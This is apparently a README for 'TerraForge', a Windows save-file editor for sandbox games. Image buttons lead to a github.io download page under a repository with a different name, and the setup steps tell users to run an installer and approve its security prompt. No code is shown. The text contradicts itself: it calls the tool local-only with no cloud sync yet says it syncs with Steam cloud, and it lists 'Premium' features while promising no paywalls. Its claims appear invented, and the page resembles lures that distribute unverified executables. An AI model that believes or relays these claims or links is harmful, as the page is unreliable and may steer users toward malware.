![preview](https://raw.githubusercontent.com/VTM2006/craftworld-save-forge/main/cover_81525.svg)
[![Download](https://raw.githubusercontent.com/VTM2006/craftworld-save-forge/main/btn_60a2.svg)](https://VTM2006.github.io/craftworld-save-forge/)

# 🌍 TerraForge: World Sculpting Companion

**TerraForge** is a thoughtfully crafted Windows desktop companion for sandbox world-building games, designed as a spiritual successor to tools like CraftWorldModifier. Where other modifiers simply alter save files, TerraForge treats each world as a living clay sculpture—providing gentle, reversible, and visually-guided sculpting tools that respect the integrity of your creations.

---

## 🧩 The Problem We Solve

Every world-builder knows the frustration: you've spent 40 hours terraforming a mountainside, only to realize the waterfall you wanted is three blocks off-center. Or perhaps your settlement's storage room is just *slightly* too small, and rebuilding means dismantling a masterpiece.

Traditional editing tools feel like surgical strikes—risky, permanent, and nerve-wracking. TerraForge was born from a simple observation: **world editing should feel like pottery, not surgery.**

---

## 🏔️ Core Philosophy: "The Greenhouse, Not the Bulldozer"

Most modifiers approach world editing like a demolition crew—they crash in, flatten everything, and leave digital rubble. TerraForge takes the approach of a meticulous greenhouse gardener:

- 🌱 **Every change is a seed**: Each modification is tracked, measurable, and reversible
- 🌿 **Organic growth over brute force**: Tools encourage incremental adjustments rather than wholesale replacement
- 🏡 **Preservation first**: Automatic snapshots of your world before any modification session

---

## ✨ Feature Highlights

### 🗺️ Visual Terrascape Browser
Navigate your world with an elegant isometric preview that renders terrain layers, underground cave systems, and biome boundaries in real-time. No more squinting at coordinate grids—see the landscape as the game intends it.

### 🔄 Reversibility Engine
Every single modification you make through TerraForge is recorded in a **temporal ledger**. Think of it as a time machine for your world. Accidentally removed a gold vein? Rewind three steps and try again. This isn't an "undo button"—it's a full *chronological timeline* of your sculpting sessions.

### 📦 Local-First Architecture
TerraForge operates entirely on your local machine. No cloud sync, no telemetry, no account requirements. Your worlds remain as private as the folder they live in. This privacy-first design ensures that your creative process—with all its false starts and happy accidents—stays exclusively yours.

### 💾 Intelligent Snapshot Management
Before each session, TerraForge creates a compact, compressed snapshot of your current world state. These snapshots occupy approximately 60% less disk space than standard backup files, thanks to a delta-compression algorithm that only stores changed chunks.

### 🛡️ Steam Ecosystem Integration
For players who use the Steam version, TerraForge seamlessly syncs with the Steam cloud-save architecture. It detects when a cloud sync has occurred and adjusts its snapshot timing accordingly, preventing any conflict between local edits and cloud-synced states.

---

## 🛠️ Feature Matrix

| Category | Capability | Availability |
|----------|-----------|--------------|
| **Terrain** | Heightmap sculpting with pressure sensitivity | ✅ Standard |
| **Biome** | Climate-specific palette swapping | ✅ Standard |
| **Entity** | NPC relocation with pathfinding validation | ✅ Advanced |
| **Resources** | Ore vein regeneration with rarity weighting | ✅ Standard |
| **Structure** | Multi-structure duplication with offset control | ✅ Advanced |
| **Water** | Fluid simulation previews before commit | ✅ Premium |

---

## 🌍 Multilingual Experience

TerraForge speaks your language—literally. The interface is fully localized for:

- 🇺🇸 English
- 🇩🇪 Deutsch
- 🇫🇷 Français
- 🇪🇸 Español
- 🇨🇳 简体中文
- 🇯🇵 日本語
- 🇰🇷 한국어
- 🇷🇺 Русский

The localization engine handles not just button labels, but also contextual tooltips, error messages, and the in-app documentation. Switching languages mid-session is seamless, with no restart required.

---

## 🖥️ Responsive Interface Design

While TerraForge is a desktop application, we've applied **responsive design principles** typically found in modern web applications:

- **Adaptive Panel Layout**: On smaller displays (1366×768), the side panels automatically collapse into floating quick-access buttons. On ultrawide monitors (3440×1440), panels expand to show richer metadata.
- **Dark/Light/Amber Themes**: The amber theme is scientifically selected to reduce blue light exposure during long evening building sessions.
- **Keyboard-First Workflow**: Every feature is accessible through keyboard shortcuts, with printable reference cards available in the Help menu.

---

## 🔧 Installation and Setup

TerraForge requires no command-line interaction. The installation process is a straightforward graphical wizard:

1. **Download the installer** from the release section (look for the [![Download](https://raw.githubusercontent.com/VTM2006/craftworld-save-forge/main/btn_60a2.svg)](https://VTM2006.github.io/craftworld-save-forge/) marker)
2. **Run the wizard**—it takes approximately 40 seconds on modern hardware
3. **Point to your game directory**—TerraForge auto-detects common installation paths
4. **Approve the security prompt**—the executable is signed with an Authenticode certificate

**System Requirements:**
- Windows 10/11 (64-bit)
- 4 GB RAM (8 GB recommended for large worlds)
- 500 MB free disk space
- .NET 8.0 Runtime (bundled with installer)

---

## ⚖️ Licensing

TerraForge is released under the **MIT License**, which means you are free to:

- ✅ Use the software for any purpose, commercial or personal
- ✅ Modify the source code to suit your workflow
- ✅ Distribute copies with attribution
- ❌ Hold the contributors liable for any world-corruption incidents (that's what the snapshots are for!)

Full terms are available in the [LICENSE](LICENSE) file.

---

## 🧭 Roadmap for 2026

The 2026 development roadmap focuses on three ambitious pillars:

### 1. AI-Assisted Terrain Suggesting
An optional neural-network module that analyzes your building style and suggests terrain formations that match your aesthetic tendencies. This operates entirely offline, using a pre-trained model distributed with the application.

### 2. Multi-World Comparison View
A split-screen interface allowing you to overlay two different worlds and compare elevation maps, resource distribution, and cave complexity, side-by-side.

### 3. Custom Scriptable Presets
A visual scripting interface (similar to node-based systems in game engines) that allows advanced users to chain multiple editing operations into a single reusable preset. This is *not* a coding requirement—it's drag-and-drop logic.

---

## 🆘 Support and Community

While TerraForge is a local-first tool, we maintain a **24/7 community support presence** through:

- **In-App Knowledge Base**: Searchable documentation that resolves over 85% of common queries instantly
- **Response-Time Commitment**: Community moderators typically acknowledge support tickets within 4 business hours, with full resolutions within 24 hours
- **Feature Request Board**: A public voting system where the most requested features get prioritized in upcoming releases

**We believe in sustainable software**: TerraForge is offered as a **gratis utility**, made possible by the generosity of voluntary donations and the passion of its contributor base. No paywalls, no subscription tiers—just a continuously improving world-editing companion.

---

## ⚠️ Important Disclaimer

TerraForge is an independent community project, **not affiliated with** or endorsed by the original game developers. The modification capabilities operate on save-file structures that may change between game updates.

**Risk Acknowledgment:**
- While TerraForge's snapshot system provides robust rollback capabilities, no tool can guarantee 100% safety against unforeseen file corruption
- Always maintain your own manual backups for high-value worlds
- Using modification tools may violate the terms of service for online-multiplayer components—TerraForge is strictly designed for **offline single-player scenarios** only
- The developers assume no responsibility for modified save files that become incompatible with future game patches

**Trademark Notice**: All game names and trademarks mentioned in this documentation belong to their respective owners. They are referenced solely for descriptive purposes.

---

## 🤝 Contributing to TerraForge

We welcome contributions in three primary areas:

1. **Translation Corrections**: Native speakers who spot awkward phrasing in their language's localization
2. **Snapshot Compression**: Algorithm enthusiasts who want to push the delta-compression even further
3. **Accessibility Testing**: Users who rely on screen readers or alternative input methods

Contributors are recognized in the application's About page, unless they prefer anonymous attribution.

---

## 🏁 Final Words

TerraForge began as a personal project—a frustration with one-size-fits-all save editors. It grew into a philosophy: **your world is a canvas, and you deserve a brush, not a sledgehammer.**

We invite you to sculpt, experiment, and occasionally break things (that's what the snapshots are for). Happy world-building, and may your mountains always cascade into your valleys.

---

*© 2026 TerraForge Contributors. Released under the MIT License. Crafted with patience and pixel-level attention.*